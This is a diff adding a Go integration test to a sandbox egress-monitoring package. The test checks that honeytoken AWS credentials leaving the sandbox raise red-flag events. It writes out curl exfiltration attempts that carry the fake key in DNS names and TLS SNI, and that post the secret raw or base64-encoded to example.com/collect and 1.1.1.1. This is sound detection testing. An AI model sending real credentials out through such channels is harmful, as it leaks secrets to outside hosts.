@@ -4,6 +4,7 @@ package netpol
 
 import (
 	"context"
+	"encoding/base64"
 	"encoding/json"
 	"os"
 	"os/exec"
@@ -13,6 +14,7 @@ import (
 	"time"
 
 	"github.com/Frostykiller3m/Quaarant/internal/events"
+	"github.com/Frostykiller3m/Quaarant/internal/honeytoken"
 )
 
 // attachWithDNS attaches a netns link and points the namespace's resolv.conf at its gateway
@@ -231,5 +233,64 @@ func TestITestAdoptAndPrune(t *testing.T) {
 	}
 	if !rec2.find(events.KindNet, contains(`"sni":"example.com"`)) {
 		t.Error("the adopted link's events did not reach the new emitter")
+	}
+}
+
+// TestITestHoneyEgress: a honeytoken leaving the sandbox in a DNS name, a TLS SNI or a
+// plaintext request (raw or base64) is a red-flag event, whether or not the policy lets the
+// connection through.
+func TestITestHoneyEgress(t *testing.T) {
+	m, _ := itestManager(t)
+	set, err := honeytoken.Generate("/root")
+	if err != nil {
+		t.Fatal(err)
+	}
+	aws := set.Tokens[1]
+	akid, secret := aws.Secrets[0], aws.Secrets[1]
+	run := func(rules Rules, id string) *recorded {
+		rec := &recorded{}
+		rules.Honey = honeytoken.NewMatcher(set)
+		l := attachWithDNS(t, m, id, rules, rec)
+		b64 := base64.StdEncoding.EncodeToString(aws.Content)
+		for _, args := range [][]string{
+			{"https://" + strings.ToLower(akid) + ".example.com/"},                                                      // DNS
+			{"--resolve", strings.ToLower(akid) + ".x.com:443:1.1.1.1", "https://" + strings.ToLower(akid) + ".x.com/"}, // SNI
+			{"-d", "k=" + secret, "http://example.com/collect"},                                                         // plaintext
+			{"-d", "blob=" + b64, "http://example.com/collect"},                                                         // base64 of the file
+			{"-d", "k=" + secret, "http://1.1.1.1/"},                                                                    // plaintext to a refused address
+		} {
+			_, _ = curl(t, l.Netns, args...)
+		}
+		time.Sleep(300 * time.Millisecond)
+		return rec
+	}
+	for _, tc := range []struct {
+		name  string
+		rules Rules
+	}{
+		{"log mode", Rules{Mode: ModeLog}},
+		{"allow mode", Rules{Mode: ModeAllow, Allow: []string{"pypi.org"}}},
+	} {
+		t.Run(tc.name, func(t *testing.T) {
+			rec := run(tc.rules, strings.Fields(tc.name)[0])
+			defer func() {
+				if t.Failed() {
+					rec.dump(t)
+				}
+			}()
+			wants := [][]string{
+				{`"trigger":"egress_dns"`, `"token_kind":"aws_credentials"`, `"dst":"` + strings.ToLower(akid)},
+				{`"trigger":"egress_sni"`, `"token_kind":"aws_credentials"`},
+				{`"trigger":"egress_plaintext"`, `"dst":"1.1.1.1"`}, // refused, still flagged
+			}
+			if tc.rules.Mode == ModeLog { // in allow mode example.com never resolves: nothing is sent
+				wants = append(wants, []string{`"trigger":"egress_plaintext"`, `"dst":"example.com"`})
+			}
+			for _, w := range wants {
+				if !rec.find(events.KindHoneytoken, contains(w...)) {
+					t.Errorf("no honeytoken event with %q", w)
+				}
+			}
+		})
 	}
 }
